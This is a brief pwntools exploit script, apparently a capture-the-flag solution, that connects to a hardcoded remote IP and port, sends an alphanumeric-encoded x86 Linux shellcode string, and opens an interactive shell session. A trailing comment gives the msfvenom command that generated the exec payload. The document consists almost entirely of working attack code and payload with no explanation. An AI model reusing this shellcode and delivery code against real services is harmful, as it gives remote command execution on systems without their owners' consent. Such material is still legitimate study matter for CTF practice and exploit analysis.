from pwn import *
context(arch = 'i386', os = 'linux')
r = remote('155.69.144.206', 22805)
ans="VTX10X41PZ41H4A4K1TA91TAFVTZ32PZNBFZDQE02DQF0D11DJEJNKK601J4B4G125A2F2Z5M053W3H03KP5G3I0C3J803Z5B8O1742160Z1H100G2B09152D0Y2F5J371R7N5B3B39NK094L5I0O"
r.send(ans)
r.interactive()
# msfvenom -p linux/x86/exec -e x86/alpha_upper BufferRegister=ESP -o ~/Desktop/NTU-CTF/attachments_2/test.txt